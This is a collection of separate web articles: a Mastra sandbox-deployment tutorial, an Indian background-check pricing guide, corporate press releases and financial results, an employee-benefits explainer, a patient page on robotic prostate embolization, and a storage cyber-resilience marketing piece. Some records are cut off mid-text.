title: Introducing Ephemeral Sandbox Deployments for Mastra Server and Studio
summary: Deploy your entire Mastra project to E2B, Daytona, or Vercel sandboxes.
body_text: You can now deploy your Mastra project (Server and Studio) to an ephemeral sandbox — manually or programmatically, with configurable runtime limits. Share previews with teammates, let agents deploy autonomously to verify results, or run per-user instances isolated from your infrastructure. A sandbox deploy gives you two public URLs to test your application. Open Studio to chat with your agents, or hit /api to test the endpoints directly. We're starting today with E2B , Daytona , and Vercel Sandbox , with more providers to follow. Your browser does not support the video tag. Before sandbox deployments, hosting a Mastra project meant working through the full development lifecycle — create a PR, push a deploy, share a link. Now you can skip the pipeline and deploy straight to a sandbox. Subsequent deployments reconnect to the existing sandbox without reinstalling dependencies. Each deployment writes a sandbox-deployment.json manifest with sandbox url , id , and expiresAt , so CI can smoke-test the deploy. Get started Install the deployer and a sandbox provider. The examples below use E2B : Terminal npm install @mastra/deployer-sandbox @mastra/e2b note Requires @mastra/core@1.52.0 or later, added in PR #19577 . Configure SandboxDeployer on the Mastra instance. The id identifies the sandbox — repeat deploys with the same id reconnect to the existing one instead of provisioning a fresh sandbox: src/mastra/index.ts import { Mastra } from " @mastra/core/mastra " ; import { SandboxDeployer } from " @mastra/deployer-sandbox " ; import { E2BSandbox } from " @mastra/e2b " ; export const mastra = new Mastra ({ // ... deployer: new SandboxDeployer ({ sandbox: new E2BSandbox ({ id: " mastra-sandbox-deploy " , template: " base " , timeout: 3_600_000 // 1 hour }) }) }); Manually deploy Add your E2B API key to .env : .env E2B_API_KEY = e2b_... mastra build doesn't auto-load .env , and the deployer needs your provider credentials at build time. Install dotenv-cli and wire up a deploy script that loads .env before running the build: Terminal npm install -D dotenv-cli package.json { " scripts " : { " deploy " : " dotenv -e .env -- mastra build " } } Then build and deploy in one command: Terminal npm run deploy Each deploy outputs two URLs to the terminal and writes a manifest into .mastra/output : API endpoints: https://4111-eijrptonwfyfew4q7cnl6.e2b.app/api Studio: https://4111-eijrptonwfyfew4q7cnl6.e2b.app .mastra/output/sandbox-deployment.json { " provider " : " e2b " , " sandboxId " : " mastra-sandbox-deploy " , " url " : " https://4111-eijrptonwfyfew4q7cnl6.e2b.app " , " port " : 4111 , " deployedAt " : " 2026-08-04T12:46:50.675Z " , " expiresAt " : " 2026-08-04T13:46:50.675Z " } Hit API endpoints by appending /api to the sandbox url : Terminal curl -s -X POST < sandbox-ur l > /api/agents/weatherAgent/generate \ -H " Content-Type: application/json " \ -d ' {"messages":[{"role":"user","content":"Weather in London"}]} ' \ | jq -r ' .text ' Programmatically deploy From CI, agent code, or your own scripts, use deployToSandbox() to deploy. By default this is API only — pass studio: true to include Studio: import { deployToSandbox } from " @mastra/deployer-sandbox " ; import { E2BSandbox } from " @mastra/e2b " ; const deployment = await deployToSandbox ({ sandbox: new E2BSandbox ({ id: " ci-smoke " , template: " base " , timeout: 3_600_000 // 1 hour }), dir: " .mastra/output " , studio: true // optional }); Use deployment.stop() , and deployment.destroy() for further control over the sandbox lifecycle. For more information and full configuration options, see: Deploy to a sandbox E2BSandbox reference DaytonaSandbox reference VercelSandbox reference

title: How Much Does Background Verification Cost in India? Complete Pricing Guide [2026]
summary: How much does background verification cost in India? From ₹500 basic ID checks to ₹8,000+ enterprise screening — a detailed breakdown by check type, provider, and company size.
body_text: Insights & Resources How Much Does Background Verification Cost in India? Complete Pricing Guide [2026] August 19, 2026 Shashank Yadav No comments yet Background verification costs in India typically range from ₹500 to ₹8,000+ per candidate in 2026. The exact amount depends on which checks you run, how many candidates you screen, which provider you use, and how quickly you need results. This guide breaks down real-world pricing across different check types, company sizes, and providers — so you can budget accurately for your hiring process without overspending on checks you don’t need. Background Verification Cost Breakdown by Check Type Each component of a background check carries a different cost. Here is what Indian employers typically pay in 2026: Identity Verification (₹150–₹1,500 per candidate) Identity checks validate government-issued documents against official databases. This is the most affordable layer of verification and the one every employer should run. Check Typical Cost Turnaround PAN verification ₹50–₹200 Instant–minutes Voter ID verification ₹50–₹200 Instant–minutes Driving Licence verification ₹50–₹200 Instant–minutes UAN/EPF verification ₹100–₹300 Instant–minutes Aadhaar verification (OTP-based) ₹100–₹300 Instant Bundled ID checks (e.g., Compose1 Verify) ₹500–₹1,500 Minutes Cost-saving tip: Platforms like Compose1 Verify bundle multiple ID checks (PAN, Voter ID, Driving Licence, UAN) into a single transaction, which is typically cheaper than running each check individually through separate providers. The bundled approach also saves time by cross-referencing identity data across all documents simultaneously. Employment Verification (₹500–₹2,000 per employer checked) Employment checks confirm a candidate’s previous job titles, employment dates, and sometimes reason for leaving. The cost varies based on the verification method. Method Typical Cost Turnaround Digital/database verification ₹500–₹800 24–48 hours Phone-based verification ₹800–₹1,200 2–4 days Physical verification (field agent visits) ₹1,200–₹2,000 4–7 days Most candidates have worked at 2–3 previous employers, so budgeting ₹1,500–₹4,000 for employment history verification is realistic for a standard check covering the last two employers. Education Verification (₹500–₹1,500 per degree) Education checks confirm that degrees, diplomas, and certifications are genuine. Check Type Typical Cost Turnaround Digital university database check ₹500–₹800 24–48 hours Direct university verification ₹800–₹1,500 3–10 days International degree verification ₹2,000–₹5,000 5–15 days Education verification is most critical for roles where specific qualifications are legally required — medical professionals, chartered accountants, engineers, and similar. Criminal Record Checks (₹800–₹3,000 per candidate) Criminal screening in India is more complex and expensive than identity checks because it often requires physical court record searches. Check Type Typical Cost Turnaround Digital criminal database search ₹800–₹1,500 24–48 hours District court record search (single district) ₹1,000–₹2,000 3–7 days Multi-district court search ₹2,000–₹3,000 5–10 days High Court and Supreme Court check ₹1,500–₹2,500 3–7 days Criminal checks are essential for positions involving financial responsibility, access to vulnerable populations, security roles, and leadership positions. Address Verification (₹500–₹1,500 per address) Address verification confirms that a candidate actually lives (or has lived) at the address they provided. Method Typical Cost Turnaround Digital/postal verification ₹500–₹800 2–5 days Physical field verification ₹800–₹1,500 3–7 days Drug Testing (₹1,000–₹3,000 per test) Drug screening is less common in India than in Western markets but is increasingly required by multinational employers and in safety-sensitive industries. Total Cost by Verification Package Here is what most Indian companies actually pay when they bundle checks: Package Level What’s Included Cost Per Candidate Best For Basic Identity checks only (PAN, Voter ID, DL) ₹500–₹1,500 Small businesses, low-risk roles Standard Identity + employment + education ₹2,500–₹5,000 Mid-sized companies, office roles Comprehensive Identity + employment + education + criminal + address ₹5,000–₹8,000 Enterprises, sensitive roles Enterprise/Global All of the above + international checks + drug testing ₹8,000–₹15,000+ MNCs, regulated industries Cost Comparison by Provider Type The type of provider you choose significantly affects pricing: Self-Service Platforms (Most Affordable) Platforms like Compose1 Verify operate on a pay-per-check model. You create an account, add candidate details, choose your checks, and pay at checkout. There are no sales calls, no contracts, and no minimum commitments. Typical cost: ₹500–₹1,500 per candidate for identity checks. Why this model works for small businesses: You only pay when you hire. During months when you are not recruiting, your verification costs are zero. There is no monthly subscription fee and no minimum spend. API-Based Platforms (Mid-Range) Platforms like IDfy, OnGrid, and Surepass charge per API call and typically offer volume-based discounts. These work well for companies with consistent hiring volume and the technical capability to integrate APIs. Typical cost: ₹100–₹500 per individual check via API, but requires development resources for integration. Full-Service BGV Providers (Premium) Companies like AuthBridge, SpringVerify, and HireRight offer end-to-end background verification with dedicated account management, compliance consulting, and customized reporting. These providers charge per candidate or through annual contracts. Typical cost: ₹2,500–₹10,000+ per candidate for comprehensive screening packages. Why enterprises pay more: Full-service providers handle verification that requires human judgment — interpreting court records, conducting field visits, speaking with references. This manual work drives costs higher but provides deeper verification than purely digital checks. How Company Size Affects BGV Costs Startups and Small Businesses (1–50 Employees) Recommended approach: Use a self-service tool like Compose1 Verify for identity checks on every hire. Add manual reference checks by calling previous employers directly. Reserve comprehensive BGV for sensitive roles only. Estimated annual cost: ₹10,000–₹50,000 (assuming 10–30 hires per year, primarily identity checks). Growing Companies (50–200 Employees) Recommended approach: Implement standard-level verification (identity + employment + education) for all hires. Use a platform with HRMS integration like SpringVerify to streamline the workflow. Estimated annual cost: ₹1,00,000–₹4,00,000 (assuming 40–80 hires per year at ₹2,500–₹5,000 per candidate). Enterprises (200+ Employees) Recommended approach: Comprehensive verification for all hires, with enhanced screening for sensitive roles. Enterprise contracts with providers like AuthBridge or First Advantage typically offer volume discounts of 15–30%. Estimated annual cost: ₹5,00,000–₹25,00,000+ depending on volume and check depth. 7 Ways to Reduce Background Verification Costs 1. Start with identity verification for every hire. A bundled identity check through Compose1 Verify catches the most common forms of candidate fraud — fake PAN numbers, forged Voter IDs, misrepresented identities — at a fraction of the cost of a full BGV. Reserve comprehensive checks for roles that genuinely require them. 2. Use a risk-based approach. Not every role needs the same level of screening. An entry-level data entry operator does not need the same verification depth as a finance manager handling company funds. Define two or three verification tiers based on role sensitivity. 3. Bundle checks with a single provider. Running PAN verification through one platform, Driving Licence through another, and employment checks through a third multiplies your costs through separate transaction fees and subscription charges. Bundled platforms offer better per-check rates. 4. Negotiate volume discounts. If you hire more than 50 people per year, most BGV providers will offer volume-based pricing. Even self-service platforms sometimes offer bulk credit packages at reduced rates. 5. Verify at the right stage of hiring. Run identity checks after the final interview but before extending an offer letter. Do not pay for background verification on candidates who are still in early screening rounds. 6. Avoid unnecessary international checks. If a candidate’s entire career has been in India, international screening adds cost without adding value. Only run global checks for candidates with international education or work history. 7. Automate where possible. Digital verification is faster and cheaper than manual processes. Platforms that use API-based document verification can deliver results in minutes at a lower cost than providers that rely on field agents. Hidden Costs to Watch For Setup and integration fees. Some enterprise BGV providers charge ₹25,000–₹1,00,000 for initial setup, API integration, and platform customization. Self-service tools like Compose1 Verify eliminate this cost entirely. Minimum monthly commitments. Contract-based providers often require a minimum monthly spend, typically ₹10,000–₹50,000. If your hiring is seasonal or irregular, you end up paying for verification you don’t use. Re-verification charges. When a check returns inconclusive results and needs to be re-run, some providers charge full price for the second attempt. Clarify re-verification policies before signing a contract. Compliance consulting fees. Some providers charge separately for compliance advisory services, regulatory updates, and audit support. Ask whether these are included in the per-check price. Frequently Asked Questions What is the cheapest way to do background verification in India? The most affordable approach is using a self-service identity verification platform like Compose1 Verify for basic ID checks (PAN, Voter ID, DL, UAN) at ₹500–₹1,500 per candidate, supplemented by direct reference calls to previous employers. This costs a fraction of full-service BGV while catching the most common forms of identity fraud. Is it worth paying for background verification for every employee? Yes, but the depth of verification should match the role. Identity checks are inexpensive enough to run on every hire. Comprehensive background screening — including criminal, education, and employment checks — is most cost-effective when reserved for mid-level and senior roles, positions handling sensitive data, and roles with financial responsibility. Do background verification costs vary by city in India? Physical verification components (address checks, court record searches) cost more in Tier 2 and Tier 3 cities where provider networks are thinner and field agent travel costs are higher. Digital identity checks, however, cost the same regardless of geography because they validate documents against centralized databases. Can I do background verification in-house to save money? You can handle reference calls and basic document review internally, but identity document verification against government databases requires access to verification APIs or platforms. The cost of building and maintaining these integrations internally almost always exceeds the cost of using a platform like Compose1 Verify. How often should I re-verify existing employees? Annual re-verification is recommended for employees in sensitive positions (financial handling, data access, compliance roles). For other employees, re-verification at the time of promotion or role change is sufficient. Continuous monitoring services from providers like HireRight and First Advantage offer automated post-hire screening. Related Shashank Yadav Leave a Reply Cancel reply

title: Cloudflare Announces Second Quarter 2026 Financial Results
summary: Cloudflare Announces Second Quarter 2026 Financial Results
body_text: Second quarter revenue totaled $696.1 million, representing an increase of 36% year-over-year GAAP loss from operations of $205.7 million, or 30% of total revenue, and non-GAAP income from operations of $96.1 million, or 14% of revenue Delivered Current RPO year-over-year growth of 35% San Francisco, CA, August 6, 2026 — Cloudflare, Inc. (NYSE: NET), the leading connectivity cloud company, today announced financial results for its second quarter ended June 30, 2026. “We delivered a stellar second quarter, highlighted by revenue accelerating to $696.1 million, up 36% year-over-year, and record growth in total paying customers, large customers, and developers on our platform,” said Matthew Prince, co-founder &a CEO of Cloudflare. “As the web shifts to AI answer engines and agent-driven commerce, we are seeing a fundamental rewrite of the Internet for machine-to-machine traffic. Cloudflare sits at the center of this paradigm shift—building the infrastructure, controls, developer tools, and payment rails for the Agentic Internet. The business model of the web is changing, and no company is better positioned than Cloudflare to help define its future.” Second Quarter Fiscal 2026 Financial Highlights Revenue: Total revenue of $696.1 million, representing an increase of 36% year-over-year. Gross Profit: GAAP gross profit was $499.5 million, or 71.8% gross margin, compared to $383.6 million, or 74.9%, in the second quarter of 2025. Non-GAAP gross profit was $508.9 million, or 73.1% gross margin, compared to $390.7 million, or 76.3%, in the second quarter of 2025. title: Beyond the One Big Beautiful Bill Act: What’s next for HSAs and employee benefits
summary: Explore One Big Beautiful Bill Act HSA changes, ICHRA updates, FSA limits and key employee benefits trends employers should watch.
body_text: Share The One Big Beautiful Bill Act continues to shape the employee benefits world. In a recent episode of the Benefits Buzz podcast , Chris Byrd, WEX health & benefits senior vice president, shared his insights on what has changed since the legislation passed. He discussed key health savings account (HSA) updates, other important employee benefits provisions, the growing interest in ICHRAs, and the trends employers should watch as they plan for the future. The big picture: Stability creates opportunity According to Byrd, the most important development isn’t a dramatic policy change—it’s certainty. Following the bill’s passage, regulators have released guidance that clarifies how employers can implement the law. That means organizations can now evaluate their benefit strategies with greater confidence and begin planning for upcoming enrollment seasons. Rather than reacting to legislative uncertainty, employers can focus on optimizing their benefit offerings and employee experience. Three HSA changes employers should know HSAs remain one of the most valuable tools for managing healthcare costs and building long-term financial wellness. The legislation expands both access to HSAs and the ways employers can pair them with other benefits. 1. Permanent telemedicine safe harbor Employers can now permanently offer first-dollar telehealth coverage without jeopardizing HSA eligibility. Previously, many employers worried that covering telemedicine before the deductible could disqualify employees from contributing to an HSA. That concern is gone. This gives employers more flexibility to encourage employees to use lower-cost virtual care while preserving the tax advantages of HSAs. 2. Direct primary care Is now HSA compatible Employees enrolled in direct primary care (DPC) arrangements can maintain HSA eligibility. This opens the door for employers interested in supplementing traditional health plans with DPC memberships as part of their benefits package. 3. More individual plans automatically qualify for HSAs All Bronze and Catastrophic plans purchased in the individual market are now automatically HSA-eligible. While this may not seem directly relevant to employer-sponsored plans, it significantly increases the value of individual coverage HRAs (ICHRAs) , allowing employees purchasing individual coverage to pair lower-cost plans with an HSA. Why ICHRAs are gaining momentum One of the fastest-growing conversations in employee benefits centers on ICHRAs. Instead of sponsoring a traditional group health plan, employers contribute a fixed amount of tax-advantaged dollars that employees use to purchase their own health insurance. Why the growing interest? Small employers continue to face rising healthcare premiums while often lacking dedicated HR or benefits staff. An ICHRA can simplify administration while helping employers continue offering meaningful health benefits. For employers already providing group coverage, ICHRAs can also help expand benefits to employee populations that may not currently receive coverage, such as: Part-time employees Seasonal workers Other classes of employees that may be difficult to include in traditional group plans The flexibility allows employers to maintain group coverage for full-time employees while extending benefits to additional segments of their workforce. Dependent care FSAs get a long-overdue increase The legislation also increases the dependent care flexible spending account contribution limit from $5,000 to $7,500. While employers aren’t required to adopt the higher limit, many may choose to do so to better reflect today’s childcare costs. One consideration remains: non-discrimination testing . Industry groups continue working with the IRS to simplify these rules so employers can more easily offer the higher contribution limit. Understanding Trump Accounts Another new benefit generating interest is the introduction of Trump Accounts. Designed to encourage long-term investing for children, these accounts function similarly to retirement savings vehicles, allowing investments to grow tax-free over time. For eligible newborns, the federal government provides a $1,000 seed contribution, but families with older children are also opening accounts without receiving the government funding. At this stage, however, the market is still developing. Financial institutions are beginning to offer Trump Accounts, and employers have the option to contribute on behalf of employees’ children or facilitate payroll deduction contributions. Operational processes (including account transfers and rollovers) are still evolving, making this an area worth monitoring rather than rushing into. Another trend employers should watch: GLP-1 benefits Beyond legislative changes, one of the biggest conversations in employee benefits today is how employers manage coverage for GLP-1 medications . These medications have become increasingly popular but also present significant cost challenges. Some employers are exploring alternative funding strategies, including carving GLP-1 medications out of traditional pharmacy benefits and instead reimbursing employees through HRAs. This approach may allow employers to: Better manage benefit budgets Ensure coverage is directed toward employees with clinical need Take advantage of lower consumer pricing available through manufacturer programs or discount providers As this market evolves, employers will continue looking for sustainable ways to balance employee access with affordability. Technology will continue to transform benefits Artificial intelligence is also changing how employees interact with their benefits. Rather than simply digitizing enrollment, AI is beginning to help employees: Choose the health plan that best fits their needs Understand benefit options Receive personalized guidance throughout the year Make more informed financial decisions about accounts like HSAs For employers, better decision support could lead to higher engagement, improved employee satisfaction, and better use of available benefits. The most important advice: Communicate year-round Perhaps the biggest takeaway wasn’t about legislation at all. Benefits communication shouldn’t begin and end during open enrollment. By the time employees finish choosing health plans, many are overwhelmed and simply stop paying attention. That means valuable benefits (such as HSAs, voluntary benefits, or wellness programs) often receive far less consideration than they deserve. Instead, employers should think about benefits communication as an ongoing conversation. Successful organizations: Keep messaging simple and free of technical jargon. Explain benefits in practical, relatable terms. Reinforce key messages throughout the year. Use regular touchpoints instead of relying solely on open enrollment. For example, employees can change HSA contribution amounts at any point during the year. Reminding them after receiving a bonus, tax refund, or life change may be far more effective than mentioning it during an already crowded enrollment period. Looking ahead The benefits landscape appears relatively stable heading into 2027, giving employers an opportunity to focus less on reacting to legislation and more on building thoughtful, employee-centered benefit strategies. Whether that means expanding HSA offerings, evaluating ICHRAs, monitoring emerging benefit options like Trump Accounts, or investing in better employee communication, the organizations that succeed will likely be those that continually educate and engage their workforce. In employee benefits, strategy matters, but communication is what ultimately drives participation and value. Don’t forget to check out our podcast episode to learn more about the One Big Beautiful Bill Act. Copyright ©2026 WEX Inc. All rights reserved. body_text: View All News Covista Expands and Strengthens Leadership Bench to Accelerate Purpose at Scale August 5, 2026 Download (opens in new window) Scott Liles Expands Remit to Lead Corporate Strategy and New Performance Acceleration Office Rick Sinkfield Joins as Vice President of Expansion CHICAGO--(BUSINESS WIRE)-- Covista (NYSE: CVSA), America's largest healthcare educator, today announced an expanded leadership role for Scott Liles and the addition of Rick Sinkfield as Vice President of Expansion, both in support of the company's three-year Purpose at Scale growth strategy built around four core principles: operational excellence, platform extension, employer integration and technology focus. "These moves strengthen our ability to execute our growth strategy in the marketplace," said Steve Beard, Chairman and Chief Executive Officer, Covista. "Scott and Rick bring the integrated, enterprise-wide thinking and discipline to carry Purpose at Scale forward. Continuing to build our leadership bench now is how we ensure our growth ambitions and our execution stay in lockstep to deliver on our purpose: to open doors and unlock potential." Scott Liles Named Chief Strategy and Performance Officer and President, Medical and Veterinary In addition to his role as President of the Medical and Veterinary segment, Scott Liles will lead corporate strategy and a newly formed Performance Acceleration Office, effective immediately. Liles will continue to report to Beard. "Corporate strategy, performance acceleration and the development of new growth capabilities are most effective when approached as a single, integrated function," said Scott Liles, Chief Strategy and Performance Officer, Covista, and President, Medical and Veterinary. "Bringing them together sharpens our view of where to invest and strengthens our ability to execute against the priorities that matter most to Covista's growth moving forward as part of Purpose at Scale ." Rick Sinkfield Joins as Vice President of Expansion Rick Sinkfield will join Covista on Aug. 10 as Vice President of Expansion, reporting to Beard and joining the company's senior leadership team. Sinkfield brings more than two decades of experience leading growth, legal and compliance strategy in complex, regulated markets across the U.S. and Latin America. Sinkfield most recently served as Chief Legal Officer at Educational Testing Service (ETS). Prior to that, he spent 20 years at Laureate Education (Nasdaq: LAUR), where he led the company's strategic restructuring and divestiture process and earlier built the company's multi-jurisdictional legal and compliance organization across a nine-country, $3 billion revenue Latin America business segment spanning 150 campuses. Sinkfield will oversee enterprise-wide expansion efforts, including Chamberlain University's campus growth, as well as other efforts across the Covista portfolio as part of the platform extension principle of Purpose at Scale . He will continue to serve on Chamberlain University's Board of Trustees, a seat he has held since fall 2025. "Throughout my career, I have focused on building access and opportunity at scale, guided by the conviction that the quality of that growth matters as much as its pace," said Rick Sinkfield, Vice President, Expansion, Covista. "That conviction has shaped how I've approached every role—expanding what's possible while staying grounded in who that growth is meant to serve. I look forward to bringing that same discipline to Covista and to Chamberlain University's next chapter of growth." Together, these moves add depth to the leadership team driving Purpose at Scale , bringing the organization closer to the health systems, campuses and communities Covista is built to serve. For more information, please visit covista.com . Through personalized, tech-enabled education powered by 10,000 faculty and colleagues, Covista expands access to healthcare careers and addresses the U.S. healthcare workforce shortage at scale. Covista is the parent company of American University of the Caribbean School of Medicine, Chamberlain University, Ross University School of Medicine, Ross University School of Veterinary Medicine and Walden University. body_text: PubMatic Announces Planned Retirement of Chief Financial Officer Steve Pantelick August 6, 2026 PDF Version Pantelick to serve as CFO into the first quarter of 2027, then as senior adviser through July 1, 2027; search for his successor underway NO-HEADQUARTERS/REDWOOD CITY, Calif.--(BUSINESS WIRE)--Aug. 6, 2026-- PubMatic, Inc. (Nasdaq: PUBM), the leading AI-powered ad tech company delivering digital advertising performance, today announced that Steve Pantelick, Chief Financial Officer, intends to retire after fifteen years in the role. Pantelick will continue to serve as Chief Financial Officer into the first quarter of 2027, and then as a senior adviser through July 1, 2027, to support continuity and a smooth transition. The Company has initiated a search for his successor. Since joining PubMatic in 2011, Pantelick has played a central role in the company's growth from a privately held business into a global public company, leading its finance and legal organizations including accounting, tax, treasury, SEC reporting and investor relations. Since its 2020 initial public offering, revenue has nearly doubled, and the company has generated approximately $450 million in net cash provided by operating activities, returned nearly half of it to shareholders through the repurchase of more than $211 million of its shares, and maintained a debt-free balance sheet. Under Pantelick's leadership, PubMatic has been profitable on an adjusted EBITDA basis for 41 consecutive quarters, a streak that began in 2016, more than four years before the IPO. He also helped shape the company's disciplined operating model, driving productivity gains that funded strategic reinvestment. The organization he built has the leadership depth, operating rigor and institutional knowledge to support the company's continued success. "Steve has been my partner in building PubMatic for fifteen years," said Rajeev Goel, Co-Founder and CEO. "I’ve relied on his judgment through every major decision, and the trust he has earned, inside PubMatic and with our investors, is one of the company’s great assets. He has built a strong leadership team that is well prepared for the growth opportunities ahead. I am deeply grateful for his partnership, his leadership and his friendship." "Today, I believe PubMatic is in the strongest position I have seen in my fifteen years here, which is what makes this the right time to begin planning my retirement,” said Steve Pantelick, Chief Financial Officer. “I joined PubMatic when it was a small private company, and together with Rajeev and this exceptional team, we have built something I am incredibly proud of: a global public company with a strong financial model, substantial operating flexibility and a culture of disciplined execution. My priority is continuing the momentum we reported today." The announcement coincides with PubMatic's second quarter 2026 financial results, issued separately today, which included the company's return to double-digit year-over-year revenue growth ahead of schedule and expanded profitability. title: Learn How Robotic-Assisted PAE Can Provide Enlarged Prostate Relief
summary: Learn about Prostatic Artery Embolization (PAE) for enlarged prostate, including benefits, procedure, recovery, safety, and LIBERTY® Endovascular Robotic System
body_text: What Is Prostatic Artery Embolization (PAE)? Prostatic Artery Embolization (PAE) is a minimally invasive, image-guided procedure used to treat urinary symptoms caused by Benign Prostatic Hyperplasia (BPH), commonly known as an enlarged prostate. During PAE, tiny particles are injected into selected prostatic arteries to reduce blood flow to targeted area of the prostate. PAE is designed to reduce blood flow to the targeted areas. Over time, this reduction in blood supply causes the gland to gradually shrink, which can relieve pressure on the bladder and urethra and improve urinary symptoms.1 This overview explains what PAE is, how it works, and where it fits within modern minimally invasive care. What is Benign Prostatic Hyperplasia (BPH)? Benign Prostatic Hyperplasia (BPH) is a common condition in aging men where the prostate gland gradually enlarges.1 As the prostate grows, it can compress the urethra and interfere with normal bladder function. This leads to lower urinary tract symptoms that often worsen over time and affect quality of life.1 Common symptoms include frequent urination, urgent need to urinate, weak urine stream, difficulty starting urination, incomplete bladder emptying, nighttime urination (nocturia), and disrupted sleep due to urinary urgency. What is Prostatic Artery Embolization (PAE)?1 PAE is a minimally invasive treatment performed by an interventional radiologist using real-time imaging guidance. The procedure begins with a small puncture in the wrist or groin to access the arterial system. A microcatheter is then navigated through blood vessels to the arteries supplying the prostate. Tiny embolic particles are delivered to reduce blood flow to target prostate tissue. This controlled reduction in blood supply leads to gradual shrinkage of the prostate. Most patients are observed for a short time after the procedure and return home the same day. Where does Robotic PAE fit as a treatment option? Robotic PAE is part of a broader shift in medicine toward image-guided, catheter-based treatments that avoid open surgery. These procedures require precise navigation through complex vascular anatomy using microcatheters and imaging guidance. As endovascular medicine evolves, technologies that support procedural navigation and control are increasingly being explored. One example is the LIBERTY® Endovascular Robotic System , designed to assist physicians in the navigation of endovascular instruments during catheter-based procedures. LIBERTY reflects the broader evolution of endovascular care, where robotics, imaging, and minimally invasive techniques converge to support physician-led procedures such as PAE, which require selective navigation of small pelvic arteries. Ask your doctor if a LIBERTY-assisted procedure is right for you. How Does PAE Improve Symptoms?1,2 By reducing blood flow to enlarged prostate tissue, PAE decreases the size of the gland over time. As the prostate shrinks, pressure on the urethra is reduced. This can lead to improved urine flow and reduced urinary symptoms such as urgency, frequency, and nighttime urination. Symptom improvement typically develops gradually over several weeks. Benefits of Prostatic Artery Embolization1,2 PAE is a minimally invasive treatment option for selected patients with BPH. It does not require surgical incisions or removal of prostate tissue. It is performed as an outpatient procedure, allowing most patients to go home the same day. Many patients experience improvement in urinary frequency, urgency, weak stream, and nocturia. Clinical experience has shown a favorable profile regarding preservation of sexual function compared with some surgical treatments.1,2 PAE may also be an option for patients who are not ideal surgical candidates, including those with medical comorbidities or those unable to discontinue anticoagulation therapy, as determined by a physician. Safety Profile and Side Effects1 PAE has been evaluated in multiple clinical studies and professional society consensus statements. A multi-society consensus published in the Journal of Vascular and Interventional Radiology (JVIR) reported a complication rate of less than 0.5%. Most side effects are mild and temporary. These may include increased urinary frequency, mild pelvic discomfort, blood in urine or stool, and mild gastrointestinal symptoms. These effects are generally self-limited and resolved within days to a week. References McWilliams J, Bilhim T, Carnevale F, et al. Society of Interventional Radiology Multisociety Consensus Position Statement on Prostatic Artery Embolization for Treatment of Lower Urinary Tract Symptoms Attributed to Benign Prostatic Hyperplasia. Journal of Vascular and Interventional Radiology. 2019;30:627–637.e1. Qamhawi Z, Little MW. The State of Evidence in Prostate Artery Embolization. Seminars in Interventional Radiology. 2022;39(6):571-576. Important Safety Information Not all patients are candidates for LIBERTY-assisted procedures. Patients should consult their physician to determine whether LIBERTY is appropriate for their condition. As with any endovascular procedure, serious complications may occur, including but not limited to: Arterial injury Bleeding Conversion to other manual endovascular techniques can occur and could result in a longer operative time Additional procedure-related complications LIBERTY is not indicated for coronary or neurovascular procedures. Microbot Medical does not practice medicine. Only a licensed physician can evaluate symptoms, provide a diagnosis, and recommend treatment options. Patients should discuss with their physician whether a robotic endovascular procedure is appropriate for their care.

title: Turning Storage from a Target into an Active Defender
summary: Discover how Everpure transforms storage from a passive target into an active part of cyber defense and resilience, with native protection, SecOps integration, and rapid ransomware recovery.
body_text: Summary Everpure turns storage into an active cyber resilience layer, helping organizations detect threats sooner and recover clean data at scale with immutable snapshots, AI-driven anomaly detection, and integrated recovery workflows. This week at Black Hat Las Vegas, security leaders, researchers, and practitioners from around the globe are gathering to tackle the world’s most critical cybersecurity challenges. While discussions across the expo floor span everything from advanced threat vectors to AI security, one urgent priority stands out for enterprise defenders: the impact of AI on cyber resilience . Threat actors leverage AI to accelerate and amplify their attacks. They can exploit vulnerabilities and zero-day threats at light speed creating unprecedented risk for an organization’s data and applications. This is best captured in a recent strategy briefing by the CSA CISO Community, SANS, and the OWASP Gen AI Security Project: The “AI Vulnerability Storm”: Building a “Mythos-ready” Security Program: Expedited Strategy Briefing By the CSA CISO Community, SANS, the OWASP Gen AI Security Project, and the wider community:” “We have moved into a world of containment and a focus on resilience , so metrics should now focus on the speed to recover to normal operations .” For too long, organizations have treated storage as a passive element, that simply stores data, and the security and recovery of the data is enabled through cyber security controls and backup and recovery platforms. But in today’s threat climate, passive isn’t enough. Storage should be an active defender, capable of adding to an organization’s security posture and providing instantaneous data recovery to speed threat remediation and recovery. Everpure’s cyber resilience strategy includes a comprehensive approach that transforms storage to reduce the risk of disruption and reduce the impact of disruption. These capabilities ensure the organization will survive cyber disruptions and reduce overall cyber risk. Figure 1: Cyber resilience ecosystem of the Everpure Platform. Ensure Data Surivability: Native resilience in the storage platform The foundation of active defense begins at the data layer itself. Everpure delivers built-in, native resilience directly through FlashArray ™ and FlashBlade ®. By utilizing SafeMode ™, we provide immutable, indelible snapshots that prevent unauthorized deletion, even if administrative credentials are fully compromised. These are coupled with extensive zero-trust principles to ensure only the authorized use of the platform, the access of data and the control of settings and policies. Detect Threats Faster: Integrating threat detection into your security ecosystem Storage shouldn’t exist in a silo. Everpure provides native signals that provide data and user anomalies directly into the tools your SecOps team uses every day. Everpure integrates seamlessly across the entire security stack,including SIEM , SOAR, XDR from leading threat detection platforms like CrowdStrike . Instead of forcing your team to jump between separate dashboards, we feed storage anomalies straight into your organization’s existing central nervous system. This means a storage alert can automatically trigger a SOAR playbook, correlate with endpoint telemetry in your XDR, and immediately help your analysts determine response and remediation. When Pure1 detects anomalous behavior or a partner’s security platform flags suspicious user activity and data changes, that vital context is immediately shared across your tools. Security teams can correlate storage-layer anomalies with endpoint, identity, network, and application telemetry. This allows teams to trigger automated workflows, tag affected volumes or snapshots, and drastically accelerate investigations. This means faster containment, better visibility into the blast radius, and more confidence about which data is compromised. Fast and Flexible Recovery: Leverage Native Recovery and Data Protection Platforms Many organizations want to leverage a storage first recovery architecture, utilizing the instantaneous recovery capabilities of Everpure to reduce data recovery requirements from days to minutes. Organizations can accelerate recovery from any cyberattack or outage with Everpure’s automated layered resilience and industry leading performance to slash downtime to the absolute minimum. Leveraging immutable snapshots, streaming data protection, and disaster recovery as a service, Everpure delivers ultra-fast data protection and near-instant restoration of critical workloads. When incidents strike, automated recovery zones instantly provision complete, error-free isolated recovery environments on demand. By eliminating manual bottlenecks, Everpure executes complex recoveries at unprecedented speeds, getting your business back online in minutes rather than hours or days. And for organizations who leverage data protection platforms for their disaster and cyber recovery, Everpure provides deep integration with the leading data protection vendors, including Veeam , Commvault , Rubrik . These integrations seamlessly bridge Everpure snapshots, threat signals, and recovery workflows with the platforms our customers already use daily for backup, governance, cyber recovery, and compliance. For example, an anomaly detected at the storage layer can automatically inform backup platforms to flag suspicious recovery points. Recovery workflows can then combine the flash speed of Everpure with partner-driven scanning, validation, and orchestration. This gives customers comprehensive data protection: fast indelible storage snapshots, off-array backup copies, clean recovery validation, and coordinated cyber 